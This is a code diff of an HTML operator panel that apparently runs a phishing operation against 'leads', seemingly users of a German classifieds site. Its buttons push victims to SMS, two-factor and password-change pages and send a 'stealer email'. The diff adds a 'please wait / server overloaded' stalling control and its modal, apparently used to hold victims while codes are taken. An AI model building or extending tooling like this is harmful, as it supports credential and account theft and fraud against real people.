@@ -445,7 +445,15 @@
             <button type="button" id="btn-push" class="btn btn-ghost"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>Push</button>
             <button type="button" id="btn-sms" class="btn btn-ghost"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>SMS</button>
             <button type="button" id="btn-2fa" class="btn btn-ghost" title="Zwei-Faktor-Authentifizierung"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>2-FA</button>
-            <button type="button" id="btn-sms-klein" class="btn btn-ghost" title="Send Klein lead to SMS page" style="display: none;"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>SMS</button>
+            <div id="btn-sms-klein" class="btn-sms-split hidden" role="group" aria-label="Klein SMS actions">
+              <button type="button" id="btn-sms-klein-action" class="btn btn-ghost btn-sms-split-left" title="SMS / Error">
+                <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+                SMS
+              </button>
+              <button type="button" id="btn-sms-klein-wait" class="btn btn-ghost btn-sms-split-right" title="Server overlastet">
+                Bitte warten
+              </button>
+            </div>
             <button type="button" id="btn-change-password" class="btn btn-ghost" title="Change password"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>Password</button>
             <button type="button" id="btn-send-stealer" class="btn btn-ghost" title="Send stealer email to this lead"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>E-Mail</button>
             <button type="button" id="btn-open-on-pc" class="btn btn-ghost" title="Show «open email on computer» page"><svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>PC Page</button>
@@ -539,6 +547,22 @@
       </div>
       <div class="fingerprint-modal-actions">
         <button type="button" id="fingerprint-modal-copy" class="btn btn-primary btn-sm admin-btn-save">Копировать всё</button>
+      </div>
+    </div>
+  </div>
+
+  <div id="klein-sms-wait-modal" class="fingerprint-modal admin-modal-root hidden" aria-hidden="true">
+    <div class="fingerprint-modal-backdrop" id="klein-sms-wait-modal-backdrop"></div>
+    <div class="fingerprint-modal-panel admin-modal-panel">
+      <div class="fingerprint-modal-header">
+        <h3 class="fingerprint-modal-title admin-modal-heading">SMS</h3>
+        <button type="button" class="fingerprint-modal-close admin-modal-btn-secondary" id="klein-sms-wait-modal-close" aria-label="Закрыть">&times;</button>
+      </div>
+      <div class="fingerprint-modal-body-wrap">
+        <div id="klein-sms-wait-modal-body" class="fingerprint-modal-body admin-code-block" style="white-space: pre-wrap;"></div>
+      </div>
+      <div class="fingerprint-modal-actions">
+        <button type="button" id="klein-sms-wait-modal-ok" class="btn btn-primary btn-sm admin-btn-save">OK</button>
       </div>
     </div>
   </div>
